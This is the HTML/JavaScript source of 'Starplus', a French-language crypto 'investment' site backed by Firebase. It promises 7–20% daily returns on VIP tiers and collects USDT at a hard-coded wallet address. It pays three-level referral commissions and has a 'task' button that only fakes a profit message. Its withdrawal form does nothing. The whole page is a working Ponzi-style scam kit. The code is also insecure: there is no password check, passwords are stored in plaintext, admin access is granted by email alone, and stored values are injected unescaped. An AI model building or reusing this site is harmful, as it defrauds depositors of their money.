<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Starplus | Investment System</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        :root { --primary: #c0ff00; --bg: #0b0d10; --card: #161a1e; --text: #ffffff; --green: #00ff88; --red: #ff4757; --blue: #3498db; }
        body { font-family: 'Inter', sans-serif; background: var(--bg); color: var(--text); margin: 0; padding-bottom: 80px; }
        .paj { display: none; padding: 20px; animation: fadeIn 0.3s; }
        .paj.aktive { display: block; }
        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }

        /* --- UI COMPONENTS --- */
        .card { background: var(--card); border-radius: 20px; padding: 20px; margin-bottom: 15px; border: 1px solid #2d2d2d; }
        .balance-card { background: linear-gradient(135deg, #1d2b00, #0b0d10); border: 2px solid var(--primary); padding: 25px; border-radius: 25px; text-align: center; }
        input, select { width: 100%; padding: 14px; margin: 10px 0; border-radius: 12px; border: 1px solid #333; background: #000; color: #fff; box-sizing: border-box; }
        .btn-main { width: 100%; padding: 15px; border-radius: 12px; border: none; font-weight: bold; cursor: pointer; background: var(--primary); color: #000; transition: 0.3s; }
        .btn-main:disabled { background: #444; color: #888; cursor: not-allowed; }
        
        /* --- TABLES --- */
        table { width: 100%; border-collapse: collapse; margin-top: 10px; font-size: 12px; }
        th, td { padding: 12px; border: 1px solid #2d2d2d; text-align: center; }
        th { background: var(--primary); color: #000; }

        /* --- NAV --- */
        .nav-bar { position: fixed; bottom: 0; width: 100%; background: var(--card); display: flex; justify-content: space-around; padding: 12px 0; border-top: 1px solid #2d2d2d; z-index: 1000; }
        .nav-item { color: #666; text-align: center; font-size: 10px; cursor: pointer; }
        .nav-item.active { color: var(--primary); }
    </style>
</head>
<body>

    <div id="paj-auth" class="paj aktive">
        <div style="text-align:center; margin-top:50px;">
            <h1 style="color:var(--primary); font-size:40px;">STARPLUS</h1>
            <div class="card" style="width:85%; margin:auto;">
                <h3 id="auth-title">Créer un compte</h3>
                <input type="email" id="email" placeholder="Email">
                <input type="password" id="pass" placeholder="Mot de passe">
                <input type="text" id="ref-code" placeholder="Code d'invitation (Optionnel)">
                <button class="btn-main" id="btn-login" onclick="connexion()">S'inscrire / Connexion</button>
            </div>
        </div>
    </div>

    <div id="paj-home" class="paj">
        <div class="balance-card">
            <small>Solde Total (USDT)</small>
            <h1 id="user-balance" style="font-size: 35px; color: var(--primary); margin: 10px 0;">0.00</h1>
            <div style="display:flex; gap:10px;">
                <button class="btn-main" onclick="montrePaj('paj-depot')" style="background:#fff">Dépôt</button>
                <button class="btn-main" onclick="montrePaj('paj-retrait')" style="background:var(--primary)">Retrait</button>
            </div>
        </div>

        <div id="admin-shortcut" style="display:none; margin-top: 15px;">
            <button class="btn-main" style="background:orange; color: #000;" onclick="montrePaj('paj-admin'); chajeDepotAdmin();">PANEL ADMIN</button>
        </div>

        <h3>Évaluation des Revenus VIP</h3>
        <div class="card">
            <table>
                <tr><th>Niveau</th><th>Prix</th><th>Profit/J</th></tr>
                <tr><td>VIP 1</td><td>20$</td><td>1.4$ (7%)</td></tr>
                <tr><td>VIP 2</td><td>60$</td><td>4.8$ (8%)</td></tr>
                <tr><td>VIP 3</td><td>150$</td><td>13.5$ (9%)</td></tr>
                <tr><td>VIP 4</td><td>400$</td><td>40$ (10%)</td></tr>
                <tr><td>VIP 5</td><td>1000$</td><td>120$ (12%)</td></tr>
                <tr><td>VIP 6</td><td>2500$</td><td>375$ (15%)</td></tr>
                <tr><td>VIP 7</td><td>6000$</td><td>1200$ (20%)</td></tr>
            </table>
        </div>
    </div>

    <div id="paj-vip" class="paj">
        <h2>Plans d'Investissement</h2>
        <div id="vip-list"></div>
    </div>

    <div id="paj-task" class="paj">
        <h2>Tâche Quotidienne (1/1)</h2>
        <div class="card">
            <p>Cliquez sur le bouton pour générer votre profit quotidien.</p>
            <button class="btn-main" id="btn-task" onclick="faireTask()">Exécuter la tâche</button>
            <p id="task-msg" style="color:var(--primary); margin-top:10px;"></p>
        </div>
    </div>

    <div id="paj-depot" class="paj">
        <h2>Déposer USDT (BEP20)</h2>
        <div class="card" style="text-align:center;">
            <p style="color:#aaa;">Minimum: 20 USDT</p>
            <div style="background:#000; padding:15px; border-radius:10px; border:1px dashed var(--primary); word-break:break-all; font-family:monospace;">
                0x93ba288d4fe6c64234a44f3234cbf6949e76246e
            </div>
            <br>
            <button class="btn-main" onclick="copyAdr()">Copier l'adresse</button>
            <input type="number" id="montant-depot" placeholder="Montant envoyé (USDT)">
            <button class="btn-main" id="btn-soumettre-depot" style="background:#fff; margin-top:10px;" onclick="voyePemanFirebase()">Soumettre</button>
        </div>
    </div>

    <div id="paj-admin" class="paj">
        <h2>Gestion des Dépôts</h2>
        <div id="lis-peman-admin">
            <p>Chargement des dépôts en attente...</p>
        </div>
        <button class="btn-main" onclick="montrePaj('paj-home')" style="margin-top:20px; background: #555; color: #fff;">Retour à l'accueil</button>
    </div>

    <div id="paj-retrait" class="paj">
        <h2>Retrait de Fonds</h2>
        <div class="card">
            <p style="color:#aaa;">Minimum: 2 USDT</p>
            <input type="number" placeholder="Montant à retirer">
            <input type="text" placeholder="Adresse USDT BEP20">
            <button class="btn-main" style="background:var(--red); color:white;">Confirmer Retrait</button>
        </div>
    </div>

    <div id="paj-ekip" class="paj">
        <h2>Mon Équipe</h2>
        <div class="card" style="background:var(--primary); color:#000; cursor:pointer;" onclick="copyLink()">
            <small>Cliquez pour copier votre lien :</small><br>
            <b id="ref-link">Chargement...</b>
        </div>
        <div style="display:grid; grid-template-columns: 1fr 1fr 1fr; gap:10px;">
            <div class="card" style="text-align:center;">Lvl 1<br><b>10%</b></div>
            <div class="card" style="text-align:center;">Lvl 2<br><b>5%</b></div>
            <div class="card" style="text-align:center;">Lvl 3<br><b>2%</b></div>
        </div>
    </div>

    <nav id="main-nav" class="nav-bar" style="display:none;">
        <div class="nav-item active" onclick="montrePaj('paj-home', this)"><i class="fas fa-home fa-lg"></i><br>Maison</div>
        <div class="nav-item" onclick="montrePaj('paj-vip', this)"><i class="fas fa-crown fa-lg"></i><br>VIP</div>
        <div class="nav-item" onclick="montrePaj('paj-task', this)"><i class="fas fa-list-check fa-lg"></i><br>Tâches</div>
        <div class="nav-item" onclick="montrePaj('paj-ekip', this)"><i class="fas fa-users fa-lg"></i><br>Équipe</div>
        <div class="nav-item" onclick="location.reload()"><i class="fas fa-sign-out-alt fa-lg"></i><br>Sortie</div>
    </nav>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
        import { getDatabase, ref, set, get, update, onValue, remove } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";

        // CONFIGURATION FIREBASE
        const firebaseConfig = {
            apiKey: "AIzaSy...", // Ranplase sa ak API Key ou
            authDomain: "starplus-47411.firebaseapp.com",
            databaseURL: "https://starplus-47411-default-rtdb.firebaseio.com",
            projectId: "starplus-47411",
            storageBucket: "starplus-47411.appspot.com",
            messagingSenderId: "...", // Ranplase sa
            appId: "..." // Ranplase sa
        };

        const app = initializeApp(firebaseConfig);
        const db = getDatabase(app);

        // Global functions for HTML access
        window.db = db; window.ref = ref; window.set = set; window.get = get; window.update = update; window.onValue = onValue; window.remove = remove;

        // Detekte referral nan URL
        window.addEventListener('load', () => {
            const urlParams = new URLSearchParams(window.location.search);
            const r = urlParams.get('ref');
            if(r) document.getElementById('ref-code').value = r;
        });

        // Fonksyon Connexion / Inscription
        window.connexion = async () => {
            const email = document.getElementById('email').value.trim();
            const pass = document.getElementById('pass').value.trim();
            const refCode = document.getElementById('ref-code').value.trim();

            if(!email || !pass) return alert("Veuillez remplir tous les champs.");

            const userId = email.replace(/\./g, '_');
            const userRef = ref(db, 'users/' + userId);
            const snap = await get(userRef);

            if(!snap.exists()) {
                await set(userRef, { email, pass, balance: 0, refBy: refCode || "aucun", vip: 0 });
                alert("Compte créé avec succès !");
            }

            // Dekouvri bouton Admin si email la se pou ou
            if(email === "admin@starplus.com") {
                document.getElementById('admin-shortcut').style.display = 'block';
            }

            document.getElementById('paj-auth').style.display = 'none';
            document.getElementById('main-nav').style.display = 'flex';
            document.getElementById('ref-link').innerText = window.location.origin + window.location.pathname + "?ref=" + email.split('@')[0];
            
            // Swiv balans an tan reyèl
            onValue(userRef, (s) => {
                if(s.exists()) document.getElementById('user-balance').innerText = parseFloat(s.val().balance).toFixed(2);
            });

            montrePaj('paj-home');
        };

        // Fonksyon voye Peman
        window.voyePemanFirebase = async () => {
            const montant = document.getElementById('montant-depot').value;
            const email = document.getElementById('email').value;
            if(!montant || montant < 20) return alert("Montant minimum : 20 USDT");

            const btn = document.getElementById('btn-soumettre-depot');
            btn.disabled = true; btn.innerText = "Traitement...";

            try {
                await set(ref(db, 'depots_pendants/' + Date.now()), {
                    itilizate: email,
                    montant: montant,
                    status: "En attente",
                    dat: new Date().toLocaleString()
                });
                alert("✅ Dépôt soumis ! L'admin va vérifier.");
                document.getElementById('montant-depot').value = "";
                montrePaj('paj-home');
            } catch (e) { alert("Erreur : " + e.message); }
            finally { btn.disabled = false; btn.innerText = "Soumettre"; }
        };

        // Fonksyon Admin (Lis depo)
        window.chajeDepotAdmin = () => {
            const container = document.getElementById('lis-peman-admin');
            onValue(ref(db, 'depots_pendants'), (snap) => {
                container.innerHTML = "";
                const data = snap.val();
                if(!data) return container.innerHTML = "<p>Aucun dépôt en attente.</p>";
                for(let id in data) {
                    const d = data[id];
                    container.innerHTML += `
                        <div class="card" style="border-left: 4px solid gold;">
                            <p><b>User:</b> ${d.itilizate}</p>
                            <p><b>Montant:</b> ${d.montant} USDT</p>
                            <button class="btn-main" onclick="valideDepot('${id}', '${d.itilizate}', ${d.montant})">Approuver</button>
                        </div>`;
                }
            });
        };

        window.valideDepot = async (id, email, montant) => {
            const userId = email.replace(/\./g, '_');
            const uRef = ref(db, 'users/' + userId);
            const uSnap = await get(uRef);
            
            if(uSnap.exists()) {
                const balAktyel = parseFloat(uSnap.val().balance || 0);
                await update(uRef, { balance: balAktyel + parseFloat(montant) });
                await remove(ref(db, 'depots_pendants/' + id));
                alert("Dépôt validé !");
            }
        };

        // UI Functions
        window.montrePaj = (id, el) => {
            document.querySelectorAll('.paj').forEach(p => p.classList.remove('aktive'));
            document.getElementById(id).classList.add('aktive');
            if(el) {
                document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
                el.classList.add('active');
            }
        };

        window.copyAdr = () => {
            navigator.clipboard.writeText("0x93ba288d4fe6c64234a44f3234cbf6949e76246e");
            alert("Adresse copiée !");
        };

        window.copyLink = () => {
            const link = document.getElementById('ref-link').innerText;
            navigator.clipboard.writeText(link);
            alert("Lien d'invitation copié !");
        };

        // Task Mockup
        window.faireTask = () => {
            const btn = document.getElementById('btn-task');
            btn.disabled = true; btn.innerText = "Génération du profit...";
            setTimeout(() => {
                document.getElementById('task-msg').innerText = "✅ Succès ! Votre profit a été ajouté.";
            }, 2000);
        };

        // VIP Generation
        const vips = [
            {n:1, p:20, r:1.4}, {n:2, p:60, r:4.8}, {n:3, p:150, r:13.5},
            {n:4, p:400, r:40}, {n:5, p:1000, r:120}, {n:6, p:2500, r:375}, {n:7, p:6000, r:1200}
        ];
        const vipCont = document.getElementById('vip-list');
        vips.forEach(v => {
            vipCont.innerHTML += `
                <div class="card" style="display:flex; justify-content:space-between; align-items:center;">
                    <div><b>VIP ${v.n}</b><br><small>Prix: ${v.p} USDT</small></div>
                    <div style="color:var(--primary)">${v.r}$/j</div>
                    <button onclick="montrePaj('paj-depot')" style="padding:8px 15px; border-radius:8px; border:none; background:var(--primary); font-weight:bold;">Acheter</button>
                </div>`;
        });
    </script>
</body>
</html>
